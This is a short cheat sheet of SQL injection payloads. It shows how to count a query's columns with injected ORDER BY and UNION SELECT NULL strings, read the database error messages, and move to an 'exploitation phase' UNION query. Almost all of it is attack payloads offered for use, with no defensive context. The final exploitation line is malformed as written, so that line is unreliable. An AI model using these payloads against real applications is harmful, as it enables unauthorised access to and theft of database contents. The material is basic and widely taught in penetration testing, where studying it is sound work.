SQL Injection Payloads

>>>....1) To determine the no. of columns in the table

>> 1ST METHOD : ORDER BY clauses

SELECT * FROM customers ORDER BY 1;
SELECT * FROM customers ORDER BY 2;
SELECT * FROM customers ORDER BY 3;
etc.

' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.

until the error doesn't come as below,
 Error: 1st ORDER BY term out of range - should be between 1 and 5

 Error: The ORDER BY position number 7 is out of range of the number of items in the select list.


>> 2ND METHOD : UNION SELECT NULL, you determine the column count by adding NULL values one at a time.

SELECT * FROM customers UNION SELECT NULL
SELECT * FROM customers UNION SELECT NULL,NULL
etc.

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.

until the error doesn't comes as below,
 Error: SELECTs to the left and right of UNION do not have the same number of result columns

 Error : All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.

	After that, When the error disappears, the number of NULL values = number of columns in the original query.

>Exploitation Phase:
SELECT * FROM CUSTOMERS ' UNION SELECT 'TEST',NULL,NULL,NULL,NULL--



